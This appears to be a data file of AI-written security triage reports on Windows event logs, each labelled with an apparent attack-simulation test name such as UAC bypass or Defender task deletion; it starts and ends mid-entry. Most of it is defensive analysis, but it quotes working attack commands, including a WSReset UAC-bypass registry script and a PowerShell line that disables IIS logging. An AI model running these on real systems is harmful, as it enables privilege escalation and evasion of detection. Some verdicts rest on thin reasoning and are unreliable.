Given these findings, the logs contain activities indicative of potentially malicious actions; however, a definitive conclusion requires further data such as PowerShell command captures, authentication logs, and user activity context.

**Resolution: SUSPICIOUS**

### Recommended Steps:
- **Immediate Investigation**: Correlate these Sysmon events with other event logs such as Security and Application logs to confirm or refute the hypothesis of malicious behavior.
- **Forensic Analysis**: Assess additional logs from the system to check for unauthorized access attempts or credential misuse.
- **Endpoint Monitoring**: Increase monitoring on this system and associated accounts for any further unusual activities or recurrence of the observed behaviors.
- **Security Scan**: Conduct a full malware and antivirus scan on the system to detect any potentially dormant or active threats.
- **Log Review and Preservation**: Preserve the logs for deep dive analysis and consult with the EDR system to ascertain the triggering condition for the alert.
"
Create ADS PowerShell,"Upon analyzing the provided Windows event logs, several observations can be made:

### Application Log
- **Microsoft-Windows-Security-SPP and edgeupdate logs**: The logs show activities related to the Software Protection Platform Service and Microsoft Edge Update. The edgeupdate service entries show that the service was stopped, which may be part of a normal update cycle. 

### Windows PowerShell Log
- **PowerShell Execution**: A script was executed using PowerShell on `Server002` by the user `admin_test`. The command involves using Alternate Data Streams (ADS) with command-line arguments related to manipulating file streams. Such practices can be used by legitimate enterprises but also in malicious activities to hide data. However, no overtly malicious actions are directly visible from this data.

### Sysmon Log
- **Process Creation Patterns**: There are multiple entries showing execution of `powershell.exe`, `wevtutil.exe`, and `conhost.exe` by the `admin_test` user. The repeated use of `whoami.exe` and manipulation via command-line using PowerShell and other system utilities can hint at privilege escalation attempts or attempts at evasion, but no further malicious logic is clearly deduced from the given data.
- **Presence of WmiPrvSE.exe and svchost.exe**: These are common system processes but often need scrutiny due to their potential misuse in malicious scenarios. However, based on these logs, no definite malicious indicators are identified.
- **Microsoft Edge Update Activity**: There are many legitimate update processes present in the logs for Microsoft Edge, shown by entries of the `MicrosoftEdgeUpdate.exe` process. These updates usually run under `NT AUTHORITY\SYSTEM`, as they are expected to have higher privileges.

### Security Log
- **Logon Events (4624) and Special Privilege Assignments (4672)**: These are indicative of typical system logon activities under `SYSTEM` account. The presence of these logs can potentially indicate the usage by system tasks rather than a breach. 
- **Security Event ID 4798**: A large number of queries for local accounts (`Administrator`, `admin_test`, and others) originating from `taskhostw.exe` might be indicative of a script or maintenance task querying account status and is not immediately suggestive of malicious behavior beyond normal administrative usage.

### Assessment Summary
- **No explicit indications of malicious activity** were found in the logs; however, the PowerShell command involving ADS manipulation could be looked into more deeply depending on context.
- **Common system maintenance and update activities** seem prevalent, notably for Microsoft Edge.
- **No clear signs of execution anomalies or privilege escalations** were observed beyond normal administrative and system activities on Server002.

### Resolution: **SUSPICIOUS**
- Despite the lack of overtly malicious activities, the presence of PowerShell usage involving Alternate Data Streams (ADS) should be further investigated. This type of operation, while potentially benign, can also be used for obfuscation or hiding secondary payloads.

**Guidance for Proceeding**:
- Conduct threat-hunting activities focusing on the PowerShell execution patterns, paying particular attention to scripts attempting to hide data within ADS.
- Validate whether the account `admin_test` had authorization for the actions recorded during the session.
- Ensure proper monitoring of additional attempts to alter typical processes and privileges.
- Consider baselining process behavior and create alerts for deviations involving high-risk utilities or file manipulation methods."
Invoke CHM Simulate Double click,"Upon analyzing the provided set of logs, several observations can be made regarding the activities of the system ""Server002"". The logs indicate multiple processes that have been executed, often involving PowerShell commands, which can be an area of concern depending on the context of their execution. Here's a detailed analysis of the logs:

### Sysmon Logs
1. **PowerShell Executions**:
   - Several instances of `powershell.exe` have been executed, including commands such as `Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath Test.chm`. PowerShell is commonly used for both legitimate administrative tasks and malicious activities, making it necessary to carefully examine the context.
   - There is a command to write ""Final result: 1"" using `powershell.exe`. This syntax indicates a script execution where the result is output to the console. While the command itself appears harmless, multiple executions in quick succession may indicate scripted or automated processes, which can be leveraged in malicious operations.

2. **Usage of `wevtutil.exe`**:
   - The `wevtutil.exe` (Windows Event Utility) process gets called multiple times, possibly implying event log manipulation. This is particularly concerning because it’s a known tactic attackers use to delete or alter event logs to cover their tracks.

3. **Command-Line Patterns**:
   - The command `powershell.exe -ExecutionPolicy Restricted -Command $Res = 0; $Infs = Get-Item...` is indicative of an enumeration script, checking for specific conditions within Windows' setup files. While not outright malicious, this script is performing a reconnaissance function which might precede a malicious action.

### Application Log
- Contains a generic event related to the Software Protection Platform Service, which appears benign with no immediate signs of tampering.

### System Log
- Frequent updates and registry interactions are noted. The updates logged via the ""WindowsUpdateClient"" are typical, although their timing may need cross-referencing with other suspicious activities.

### Windows PowerShell Log
- Confirms that the PowerShell scripts executed have been logged, showing multiple execution entries corresponding to the Sysmon logs. This consistent pattern of using PowerShell might suggest an attempt to achieve persistence or execute scripts as part of a broader task or automation.

### Security Log
- No entries provided for the security log, which is unusual and could suggest deletion, lack of events during the period, or a filtering issue.

### Assessment and Recommendations
- **Anomalous Behavior**: High frequency of PowerShell executions and `wevtutil.exe` usage could indicate potential compromise or preparation for a malicious act, depending on intent.
- **Suspected Events**: The combination of event log utility operations and PowerShell scripting merits caution.
- **Resolution**: **SUSPICIOUS**

**Recommendations**:
- **Further Investigation**:
  - Review the specific context for the scripts run, especially their origin and necessity.
  - Investigate any recent changes to user privilege levels or permissions.
- **Monitoring**:
  - Increase monitoring on the given host, especially for further scripts or command-line executions.
- **Consider Logging**: Examine why there are no Security log entries during this time; ensure audit logs are properly configured and retained.
  
Ultimately, while there is no evidence of outright malicious activity, the logs point to potentially suspicious behavior that needs further investigation to rule out foul play, particularly considering the high-profile nature of the CEO's machine."
Delete an entire folder - Windows PowerShell,"### Detailed Analysis:

**Uncommon or Anomalous Behavior:**

1. **PowerShell Commands:**
   - The PowerShell logs indicate the execution of a script to remove files from the TEMP directory: `Remove-Item -Path $env:TEMP\\deleteme_folder_data.004 -Recurse`. While removing temporary files could be a legitimate administrative action, it’s noteworthy that this was performed by `SERVER002\\admin_test`, suggesting potential manual intervention.

2. **Multiple Instances of MicrosoftEdgeUpdate.exe:**
   - Numerous `MicrosoftEdgeUpdate.exe` processes were initiated. Typically, `Microsoft Edge Update` is a legitimate updater for the Microsoft Edge browser, but the repeated instances with varying CommandLine arguments like `/ping`, `/regsvc`, and `/regserver` might suggest some activity beyond ordinary updates.

3. **Frequent Use of `wevtutil.exe`:**
   - Multiple instances of `wevtutil.exe`, executed by `SERVER002\\admin_test`, appear in the logs. This tool allows interaction with event logs and can be used to clear logs or collect specific events that may point towards coverage of tracks following suspicious activity.

4. **Use of `conhost.exe`:**
   - This is seen several times and is linked to PowerShell execution (`parent process`). While this could be standard for handling console inputs, its presence should be noted in case of abnormal behavior related to PowerShell scripts.

5. **Execution of `whoami.exe` and `hostname.exe`:**
   - Commands like `whoami` are used to find the current logged-in user. Their presence, especially on a server used by an administrative account, may indicate system reconnaissance activity.

**Indications of Potential Malicious Activity:**

1. **Wevtutil Usage:**
   - The frequent execution of `wevtutil.exe` by an administrative user is concerning. It indicates potential log manipulation, which may suggest an attempt to cover footprints of other activities.

2. **Repeated `MicrosoftEdgeUpdate.exe` Calls:**
   - The sequence of `MicrosoftEdgeUpdate.exe` executions with different command line parameters could imply either a legitimate update process cycles or misuse by malicious software mimicking legitimate software behaviors.

3. **PowerShell Execution:**
   - Launch of PowerShell commands that point towards file deletion in a TEMP directory executed by an admin could potentially point towards attempts to remove temporary trace data related to other activities (though not inherently malicious on its own).

**Assessment & Recommendation:**

1. **Immediate Review Required:**
   - Investigate user `admin_test` activities. Verify if the PowerShell script execution and `wevtutil` executions were intentional administrative tasks, or if they appear out of character for regular administrative maintenance.
   
2. **Security Logs Correlation:**
   - Review additional Windows Security logs to correlate if there are any logs being cleared or altered using `wevtutil`.

3. **Edge Update Evaluation:**
   - Confirm the legitimacy of the Microsoft Edge Update processes. Ensure that these are verified and match with the official Edge updates, checking for signs of a Trojan masquerading as a legitimate process.

4. **Continuous Monitoring:**
   - Monitor for any future unexpected process executions or administrative actions on the CEO or other critical machines.

5. **Threat Detection Tuning:**
   - Consider adding detection rules for frequent PowerShell activities and the specific combination of process activity noted in this investigation (e.g., `wevtutil`, PowerShell, whoami).

**Resolution**:
- **SUSPICIOUS**: The combination of administrative PowerShell usage for file removal, frequent `wevtutil` execution, and repeated MicrosoftEdgeUpdate.exe instances is suspicious. It does not conclusively indicate compromise, but warrants further investigation to eliminate potential malicious behavior.
"
Read volume boot sector via DOS device path (PowerShell),"After analyzing the provided Windows event logs, the following observations and assessments can be made:

**System Log Analysis:**
- The logs indicate routine updates to the Microsoft Defender Antivirus, which are regular activities and important for device security.

**Application Log Analysis:**
- The events reflect normal operations, such as a service being stopped and the security product state being turned on. These indicate standard software operation without any explicit issues.

**Security Log Analysis:**
- A series of `EventID: 5379` logs suggest failed credential operations for a Microsoft account. This is somewhat unusual, as repeated credential read failures with a return code `3221226021` (indicating `STATUS_NO_SUCH_USER`) could imply issues with account authentication or unauthorized attempts to access non-existent accounts.
  
**PowerShell Log Analysis:**
- The PowerShell events show the execution of a script that creates a byte buffer and opens a handle to the C: drive. This is an uncommon action and might indicate an attempt to read raw disk data or gather information, which is typically malicious when performed without obvious purpose.
  
**Sysmon Log Analysis:**
- The `wevtutil.exe` and `conhost.exe` related events do not generally indicate malicious activity, as these applications are often seen in standard operations. However, repeated use by `admin_test` to execute several processes at the same timestamp could indicate automated or scripted execution.
- The use of PowerShell with the command that handles byte buffers and reads raw data from disk, tracked in the PowerShell logs, aligns with potential malicious activity.
  
**Overall Assessment:**
- The set of logs do not indicate widespread malware or intrusion. However, there are two points of concern:
  1. Unusual credential read operations in the Security log suggest someone might be trying (albeit failing) to access unauthorized accounts or services.
  2. The PowerShell logs indicate an anomalous activity where PowerShell is used to execute scripts interacting with raw disk data. Such activities are generally found in sophisticated malware or penetration testing scenarios.

**Resolution: SUSPICIOUS**
- **Guidance on how to proceed:**
  1. Perform an in-depth review of activities associated with the user `admin_test` and the specific machine involved. Further analyze file activity and any network connections made by PowerShell during the time period.
  2. Ensure that PowerShell logging is sufficiently detailed and examine any similar scripts or commands in recent execution history.
  3. Investigate the frequent failed authentication attempts in the Security log for `MicrosoftAccount:user=02txoixylodcstop`, ensuring this is not an indication of user enumeration or unauthorized access attempt.
  4. Review administrative access permissions, especially concerning `admin_test`, and ensure that multifactor authentication is enforced for sensitive accounts.
  5. Monitor the system for additional abnormal behaviors that could signal ongoing reconnaissance or exploitation attempts."
Delete Windows Defender Scheduled Tasks,"### Analysis of Provided Windows Event Logs

The provided logs consist of a combination of system, security, application, and Sysmon logs from a Windows environment, specifically from the machine named Server002. Below is the analysis for potential malicious or suspicious activities:

#### System Log
- The system logs indicate that the time on the machine was changed, which usually happens for synchronization purposes. This is a normal activity for Kerberos authentication or system clock synchronization.

#### Security Log
- Time change events are logged in the security logs matching the modification times, which indicates these events are consistent. The modifying process is `svchost.exe`, which is a common system process used for legitimate purposes but can also be used for malicious activities if compromised.

#### Application Log
- Contains a single entry related to the Software Protection Platform, which appears standard and does not indicate malicious activity. 

#### Sysmon Log
- **Notable Entries**:
  1. Sysmon entries show several instances of `cmd.exe` and `schtasks.exe` being executed. They appear to be querying and deleting various Windows Defender scheduled tasks:
     - Examples include querying the Windows Defender Scheduled Scan, Cleanup, Verification, and Cache Maintenance tasks, which were then followed by attempts to delete these tasks if an XML file exists.
  2. The usage of command line `schtasks` indicates scheduled tasks manipulation, which can be suspicious if done excessively or without proper authorization.
  3. Executions in a high-integrity context, using potentially benign system tools (`cmd.exe`, `schtasks.exe`), often occur in Living-off-the-Land (LotL) attack scenarios where attackers use existing tools to perform malicious activities without dropping malware.

#### Indicators of Anomalous or Malicious Activity
- The combination of querying and deleting Windows Defender tasks can be suspect since it indicates an effort to disable security mechanisms. This could be part of a breach to evade detection.
- The lack of clear-purpose commands and the volume of event entries related to system task manipulation warrant further investigation.

### Recommendations and Resolution

Given the above analysis, the observed behaviors can be summarized as follows:

- **SUSPICIOUS**: The logs present a suspicious pattern of Windows Defender scheduled task manipulation, which could be an attempt to undermine the system's security configurations. Without context of authorized administrative activity performing these actions, they appear anomalous and warrant further investigation.

### Actionable Steps
1. **Further Investigation**:
   - Verify with IT or system administrators if these activities were authorized as part of a scheduled maintenance or configuration change.
   - Check for any corresponding entries in PowerShell or other logs that might give context to these events.
   - Review network logs for any unusual outbound traffic during the times these events were generated.

2. **Mitigation**:
   - If unauthorized, immediately review and harden tasks, accounts, and permissions on the affected systems.
   - Ensure Windows Defender and other security measures are re-enabled and functioning correctly.

3. **Monitoring**: 
   - Increase monitoring of scheduled task manipulations and use of `schtasks.exe` within high-integrity processes to detect this pattern in the future.

Overall, while the events might ultimately be benign if pre-approved, their nature necessitates closer scrutiny to ensure system integrity and safeguard against potential threats."
Msiexec.exe - Execute the DllUnregisterServer function of a DLL,"Upon analyzing the provided Windows event logs, several points of interest can be identified:

1. **Repeated Execution of PowerShell and Command Line Utilities**: 
   - The logs show repeated execution of PowerShell (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`), conhost, and wevtutil utilities by the `admin_test` user on `Server002`. These utilities are often used in legitimate tasks but are also commonly leveraged in malicious activities for system reconnaissance, data exfiltration, or lateral movement in an attack scenario.
   - The execution of `cmd.exe` with a command line involving `msiexec.exe` and `MSIRunner.dll`, which is being run from a system temporary directory, is particularly suspicious. The execution of MSI packages from unexpected or temporary directories is a known tactic for running arbitrary code.

2. **Unusual Use of the `msiexec.exe` Utility**:
   - The log shows `cmd.exe` invoking `msiexec.exe` to potentially execute a suspicious DLL (`MSIRunner.dll`) located in a temporary directory. This method can be indicative of a malicious attempt to run code on the system, especially since `msiexec.exe` is a known utility for executing installation packages, which can be exploited to run malicious code.

3. **Processes Running with High Privileges**:
   - Processes like `whoami.exe` and `hostname.exe` are run with high integrity levels by `admin_test`. While these specific processes are benign in and of themselves, when correlated with other activities in the logs, they suggest possible reconnaissance behavior.

4. **Activity Related to `Microsoft Edge Update`**:
   - Various instances of `MicrosoftEdgeUpdate` are recorded in the logs, with different command lines and locations, including temporary directories. One of the command lines (`/ping`) includes a large, potentially encoded command, which could suggest obfuscation or data exfiltration attempts. The frequent updates and the creation of temporary directories call for a deeper inspection to rule out abuse of legitimate update mechanisms or the presence of a trojanized application.

Given the above observations, there are clear indicators that suggest potentially malicious activity, especially concerning the misuse of utilities like `msiexec.exe`, which could lead to code execution vulnerabilities. The utilization of system tools like PowerShell and unusual command line executions underscore the need for further examination.

### Resolution: SUSPICIOUS

**Guidance on How to Proceed:**
- Conduct a deeper investigation of `MSIRunner.dll` to determine its legitimacy and origin. Verify its contents and check it against known malware signatures.
- Review other activities of the `admin_test` user on `Server002` to determine if there are other signs of malicious activity or a broader compromise.
- Check for additional signs of lateral movement or data exfiltration attempts, particularly focusing on PowerShell and command line activities.
- Consider isolating `Server002` for further forensic analysis and ensure that logging and monitoring are enhanced to capture suspicious behavior proactively.

Further steps may involve network traffic analysis and potentially checking other endpoints for similar activities to ensure no broader incident is underway."
Allow Simultaneous Download Registry,"### Detailed Analysis of the Logs

#### Overview:
The logs consist of several Sysmon events focusing primarily on process executions on a Windows machine identified as ""Server002"". The task is to determine whether these logs suggest any malicious activity. The events largely record the execution of system utilities such as `wevtutil.exe`, `conhost.exe`, `cexe`, and others.

#### Key Observations:
1. **Use of `wevtutil.exe`:**
   - This utility is employed to manage event logs, often used for legitimate Windows administrative tasks. However, its frequent execution, particularly when done by users who typically wouldn't need to access it, might indicate an attempt to delete or export logs as part of covering the tracks of malicious actions.
   
   - The repeated execution of `wevtutil.exe` by the same user (`SERVER002\\admin_test`) without apparent necessary administrative changes could be considered suspicious. These actions are recorded by Event IDs `17956`, `17960`, `17964`, `17968`, `17972`, etc.

2. **Execution of `cmd.exe` with Registry Modifications:**
   - In event records `17982` and `17986`, `cmd.exe` invokes registry changes under the context of a high-integrity level user which is unusual and can be a sign of configuring settings meant for persistence or to increase network capability.
   
   - Modifying registry keys related to Internet settings over `cmd.exe` could be for legitimate tuning but is suspicious if not justified by a known administrative task.

3. **Execution of `whoami.exe` and `hostname.exe`:**
   - Generally not suspicious on their own, these commands simply query system and user information. However, when they closely follow the execution of system configuration changes or administrative utilities, it can indicate an attacker is checking their execution context or confirming their actions.

4. **High-Integrity and System Level Processes:**
   - High-frequency execution of commands and utilities under high integrity (`IntegrityLevel: High`) or as `NT AUTHORITY\SYSTEM` suggests actions are happening with elevated privileges, which raises concerns if unjustified by regular processes.

5. **Presence of Windows Update and Security Services Processes:**
   - Processes like `svchost.exe`, `sppsvc.exe`, `TrustedInstaller.exe`, and `TiWorker.exe` are legitimate and typically associated with Windows updates and system maintenance, as evidenced by events `17990`, `17991`, `17992`, and `17993`. However, their presence amid suspicious activities heightens risk if they were sideloaded or replaced by malicious variants.

#### Threat Assessment:
The logs present several occurrences of administrative and potentially sensitive system commands being executed in quick succession by the same user without much delay, indicating potential automation or script-based interventions. There is no explicit sign of malware, but the patterns are somewhat unconventional and suggest a possible unauthorized usage scenario.

### Resolution:
**SUSPICIOUS**: The activities within the logs could be normal system administration but given their frequency and context, they warrant further investigation. Specifically, validation should be sought on:
- The legitimacy of the task requiring `wevtutil.exe` and `reg.exe` modifications.
- The necessity of the involved user's interventions.
- System integrity, ensuring utilities like `svchost.exe` and update services have not been compromised or tampered with.

### Guidance on How to Proceed:
1. **Immediate Actions:**
   - Conduct a full review of `SERVER002` user roles and actions.
   - Validate with IT or system administrators any expected administrative tasks for the period of these logs.
   - Scrutinize if there were any unusual user activities or alerts from other security systems (e.g., EDR, antivirus) during the same timeframe.

2. **Further Investigation:**
   - Consider deploying enhanced monitoring on the affected system.
   - Check for any known Indicators of Compromise (IoCs) related to actions noted in the logs.
   - If unauthorized usage is confirmed, escalate for potential incident response actions.

3. **Preventive Measures:**
   - Educate users, especially those with elevated privileges, on secure practices and unusual behavior indicators.
   - Regular audits and potentially enhanced logging could be advised for high-value assets or at-risk systems."
Disable Windows IIS HTTP Logging via PowerShell,"**Detailed Analysis of Windows Event Logs**

**Suspicious Behavior Identified:**

1. **PowerShell Activity:**
   - A PowerShell script was executed with the command: `set-WebConfigurationProperty -PSPath ""IIS:\Sites\Default Web Site\\"" -filter ""system.webServer/httpLogging"" -name dontLog -value $true`.
   - This command modifies web server configurations to stop logging HTTP requests, which is suspicious as it can be used to hide malicious activities.

2. **Privilege and Integrity Context:**
   - The PowerShell execution happened under the account `SERVER002\admin_test` with high integrity (High-Integrity Level), suggesting administrative privileges were used.
   - The command was executed in `C:\Users\admin_test\Documents`, which is typical for user-initiated PowerShell runs but worth noting due to the script's nature.

3. **Frequent Service and Process Manipulations:**
   - Repeated entries for `MicrosoftEdgeUpdate.exe` and related processes, which appear normal for updates but given the timing and other suspicious signs, could potentially be leveraged for persistence or updating with malicious payloads.
   - Multiple instances of `whoami.exe` and `conhost.exe` executing, which are benign in isolation but the frequency and sequence, if unsupported by legitimate activities, could indicate lateral movement or discovery actions.

4. **Time Change Events:**
   - System clock adjustments, though appearing benign and NTP-related (`time.windows.com`), need correlation with the script activities. These changes can sometimes conceal tracks by manipulating timestamps.

5. **Svchost.exe Activity:**
   - Standard host process but noted as a parent process for time-altering events, which needs context to ensure it's not being manipulated as part of a broader activity.

**Assessment of the Situation:**

- The execution of the PowerShell script to modify IIS configurations to disable logging is a red flag. This type of activity is commonly associated with attempts to obfuscate activities on web servers and can indicate possible compromise, especially on high-profile targets like a CEO's machine.
  
- The simultaneous Edge Update activities and svchost.exe processes could be normal maintenance or service routines. However, they're worth further context checking, specifically verifying the legitimacy and timeliness against known updates from Microsoft.

**Threats or Risks Identified:**

- **Potential Web Server Compromise:**
  By disabling logging, any subsequent web requests or scripts could go undetected, increasing the risk of prolonged unauthorized access or data exfiltration from the web server.

- **Privilege Abuse:**
  The use of high-integrity processes and administrative accounts can signify the potential for persistent, undetected activities exploiting privilege elevation.

**Guidance on How to Proceed:**

1. **Immediate Actions:**
   - Review and reset IIS logging settings to enable full logging of activities to and from the server.
   - Conduct a thorough review of logs to identify any potentially malicious requests or behaviors before the logging was disabled.
   - Verify the integrity of `MicrosoftEdgeUpdate.exe` and related instances to confirm they are legitimate and expected.

2. **Further Investigation:**
   - Assess other systems in the network to ensure similar changes have not been made, indicating wider compromise.
   - Perform a comprehensive scan for any unauthorized changes or malware, especially focusing on web-facing applications and services.
  
3. **Hardening and Monitoring:**
   - Enhance monitoring for PowerShell activities—implement logging for all scripts and their outputs.
   - Audit administrative privileges and enforce the principle of least privilege, restricting script execution and enforcing strict logging for modifications in critical configuration areas.

**Resolution:**
- **MALICIOUS** - The identified PowerShell activity to disable logging is strongly indicative of an attempt to cover illicit or malicious actions. Further investigative actions are essential to ensure containment and eradication of potential threats."
Enforce Smart Card Authentication Through Registry,"Upon carefully reviewing the provided Windows event logs from the Sysmon, System, Security, and Application logs, here is a detailed analysis of any suspicious or anomalous behavior that stands out:

### Sysmon Log Analysis:

1. **Malicious File Location:**
   - The execution of ""MicrosoftEdgeUpdate.exe"" from a temporary folder (`C:\\Program Files (x86)\\Microsoft\\Temp\\EU4B09.tmp\\`) is unusual. Normally, legitimate applications execute from their designated installation folders.
  
2. **Command Execution:**
   - The `cmd.exe` is executed with a command to add or modify a registry key under ""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"" with values that could potentially affect user account controls or system policies. This action indicates an attempt to modify system settings, which can be indicative of privilege escalation or persistence mechanisms.
  
3. **Execution of System Utilities by Admin Account:**
   - Frequent execution of `wevtutil.exe` and `conhost.exe` under the user `SERVER002\\admin_test`. While legitimate, the repetitive nature and proximity to other suspicious activities like registry modifications might signal automated scripting or unauthorized system audit/config exercises.

### System Log Analysis:

- **Time Anomalies:**
  - Adjustments to the system time can be legitimate under system updates but can also be leveraged by malicious entities to obscure their activities or evade detections. Multiple entries indicating time changes raise the question of whether this was intentional manipulation.

### Security Log Analysis:

- Event 4616 entries indicate the system time changes, as seen in the System logs. While no direct evidence of malicious intent, frequent time changes in tandem with suspicious activities could point towards potential tampering.

### Application Log Analysis:

- There are no immediate red flags in the Application logs, except for the time discrepancy noted above which needs to be correlated with other logs for a timeline of activities.

### Assessment & Recommendations:

**Assessment:**
- After examining the logs, it is noted that while there are several benign system updates and processes running, there is suspicious activity involving file execution from temporary directories, registry modifications, and potential tampering of system settings.
- The suspicious process involving registry modification and temporary-folder execution, alongside the use of legitimate system utilities by an admin account soon after these actions, raise red flags of possible malicious behavior or policy violations.

**Resolution: SUSPICIOUS**

### Guidance:

1. **Immediate Actions:**
   - Isolate the affected machine (CEO's machine) from the network to prevent potential lateral movement.
   - Conduct a full malware scan and integrity check of system files to rule out unauthorized modifications or malware presence.

2. **Further Investigations:**
   - Investigate the source and purpose of the file executed from the temporary directory to understand its origin and intention.
   - Check for any unauthorized or unknown scheduled tasks, scripts, or cron jobs that could initiate similar activities.
   - Review recent system accesses, user activity logs, and any external connections made during suspicious time windows.

3. **Mitigation:**
   - If the activity is deemed unauthorized, contemplate a reset of registry settings to default and apply stricter policies on account behavior auditing and access controls.

4. **Long-term Measures:**
   - Approve a comprehensive security review and potentially, a third-party risk assessment to bolster security postures and detect latent threats efficiently."
Decompile Local CHM File,"### Detailed Analysis of the Provided Logs

#### Sysmon Log Analysis:
1. **PowerShell Execution**: The log indicates the execution of `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` by the user `SERVER002\admin_test`. While PowerShell is a legitimate tool, its execution warrants closer scrutiny since it can be used for both administrative tasks and malicious activity.

2. **Multiple `wevtutil.exe` Executions**: The frequent execution of `C:\Windows\System32\wevtutil.exe`, a tool for managing event logs, is observed. This could potentially indicate tampering or querying of event logs. It’s executed by `SERVER002\admin_test` suggesting a user may be attempting to cover their tracks or investigate logs.

3. **`whoami.exe` and `hostname.exe` Usage**: Execution of `C:\Windows\System32\whoami.exe` and `hostname.exe` appears normal; however, they are often used in conjunction with scripts or exploits to gather system information.

4. **`cmd.exe` with Suspicious Command-Line**: 
   - The command-line argument `""cmd.exe"" /c hh.exe -decompile ...` is executed. The use of `hh.exe` (Microsoft HTML Help Executable) to decompile files is unusual and suspicious.
   - This could indicate an attempt to extract or manipulate a `.chm` (Compiled HTML) file, potentially incorporating malicious content.

5. **Frequent Edge Update Executions**: Numerous events related to `MicrosoftEdgeUpdate.exe` process are listed, executed with different command options. While these could represent routine updates, the volume and frequency within the same timestamp might indicate excessive activity or automation gone awry.

#### Application Log Analysis:
1. **Edge Update Service Stopped Events**: These entries indicate that the Edge update service stopped multiple times, aligning with the frequent process creations observed in Sysmon logs. This could raise suspicion of attempted manipulation of the update service.

2. **Windows Defender Status**: Entries indicate that Windows Defender was in the ""ON"" state, which is a positive sign of resident protection. There is no indication of antivirus disabling.

#### Assessment:
Given the analysis above, the logs contain activities that raise multiple red flags:
- **PowerShell Execution** in conjunction with uses of tools such as `wevtutil.exe`, `cmd.exe`, and `hh.exe` marks the environment as potentially at risk.
- The **command-line usage of `hh.exe`** with a `/decompile` argument is particularly indicative of potentially malicious behavior.
- Repeated **Microsoft Edge Update activities** also prompt caution, although this could be attributed to normal application behavior or misconfigurations.

### Conclusion:
The activities reflect a pattern that might suggest exploration, privilege escalation, or preparation for a compromise. While some activities may appear benign independently, their combination, especially involving file decompilation and log management tool usage, suggests the need for further investigation.

### Resolution:
**SUSPICIOUS** - The logs indicate suspicious activity that warrants deeper investigation, particularly focusing on the commands executed, the context of `hh.exe` usage, and potential log tampering. Further analysis of PowerShell script content and ensuring no unauthorized access is recommended.
"
Setting Shadow key in Registry for RDP Shadowing,"## Detailed Analysis of the Event Logs:

### Security Log:
1. **Event ID 4634** (Successful Logoff): Indicates a logoff event for the user ""admin_test"" on ""Server002"". Normally benign, but it shows user activity around the suspicious activities.
2. **Event ID 4672** (Special Privileges Assigned): The account ""admin_test"" received special privileges including ""SeDebugPrivilege"" and ""SeSecurityPrivilege"", which are often indicators of potentially malicious activity if unexpected, as they allow system-level changes.
3. **Event ID 4624** (Successful Logon): The same user ""admin_test"" logged on with NTLM authentication from ""DESKTOP-3HL5B2P"". This shows successful logon activity which corresponds with any configuration changes happening.

### Sysmon Log:
1. **Multiple Event ID 5 (Process Terminated)**: The user ""SERVER002\\admin_test"" executed a series of processes including ""wevtutil.exe"" and ""conhost.exe"" multiple times in swift succession. The frequent invocation of ""wevtutil.exe"" is highly suspicious as it can be used to query, delete, or export event logs, possibly to cover tracks.
2. **Event ID 1 (Process Creation)**:
   - The execution of ""powershell.exe"" with a complex command to enable firewall rules and modify registry settings. This is a **highly suspicious activity** as it uses ""New-CimSession"" and ""Invoke-CimMethod"" to perform modifications that could weaken system security related to Terminal Services.
   - Subsequent executions of ""hostname.exe"" and ""whoami.exe"" do not appear directly malicious but may be part of a reconnaissance or process mask strategy.
   
### Windows PowerShell Log:
- Shows the execution of PowerShell scripts that configure firewall and registry settings pertaining to Terminal Services. This aligns with observed behavior in the Sysmon log and could indicate an attempt to establish persistence or enable unauthorized remote access, which is a strong indicator of suspicious activity.

### Application and System Logs:
- An EdgeUpdate service stopped event was observed, which is an expected routine behavior for service stop events. 
- There's no data in System logs that corresponds to this timeframe or that adds further to the analysis.

## Summary of Findings:
The logs indicate activities typical of post-exploitation:
- Use of administrative privileges aligned with system-level process modifications.
- Execution of PowerShell commands that manipulate security configurations.
- Use of ""wevtutil.exe"" which can suggest event log manipulation.
- Privilege escalation indicators by assignment and use of ""SeDebugPrivilege"".

Given the activities recorded align with potential misuse of administrative capabilities, system or access configuration changes allowing unauthorized access, and potential cover-up actions, the activities are classified as **SUSPICIOUS**. Further, detailed investigation is warranted to confirm if these changes were intentional/authorized and assess any potential system compromise or misuse.

## Recommended Actions:
1. **Immediate Investigation**: Identify the origin and reasoning behind the administrative tasks. Verify with the user ""admin_test"" if these activities were legitimate.
2. **Review System Configuration Changes**: Examine changes made to the firewall and registry involving Terminal Services.
3. **Audit User Accounts and Privileges**: Check for unexpected configuration changes or privilege elevation.
4. **Event Log Review**: Ensure no removal or alteration of critical logs has been made derailing a timeline or evidence of activity.
5. **Monitoring and Alerts**: Increase monitoring of similar activities and set alerts for privilege changes and suspicious PowerShell executions.

Resolution: **SUSPICIOUS**. Further investigation needed."
UAC Bypass with WSReset Registry Modification,"Upon analyzing the provided Windows event logs, certain entries stand out that suggest potentially malicious activities, particularly the PowerShell script execution and the behavior of specific processes.

### Key Indicators:

1. **PowerShell Execution:**
   - The significant logs from the Windows PowerShell event are concerning. A PowerShell script was executed using the following command:
     ```powershell
     powershell.exe & {New-Item HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command -Force | Out-Null
     New-ItemProperty -Path HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command -Name ""DelegateExecute"" -Value """" -Force | Out-Null
     Set-ItemProperty -Path HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command -Name ""(default)"" -Value ""C:\Windows\System32\cmd.exe /c start cmd.exe"" -Force -ErrorAction SilentlyContinue | Out-Null
     $Process = Start-Process -FilePath ""C:\Windows\System32\WSReset.exe"" -WindowStyle Hidden}
     ```
   - This command attempts to modify the registry to link a custom file type handler to start a command prompt. Such actions are commonly associated with persistence mechanisms or attempts to bypass security controls.

2. **Suspicious Process Activity:**
   - The repeated execution of `C:\Windows\System32\conhost.exe`, `cmd.exe`, and `WSReset.exe` is closely tied to the PowerShell script. The WSReset.exe is legitimately used to reset the Windows Store cache but has been historically abused to execute scripts or commands with elevated privileges silently.

3. **Security Log Analysis:**
   - Event ID 4672 indicates that a user gained privileged access with privileges such as `SeDebugPrivilege`, `SeLoadDriverPrivilege`, and others. These privileges allow various high-impact activities like debugging sensitive processes or loading/unloading drivers, typically not required for standard operations unless performed by administrative tasks.

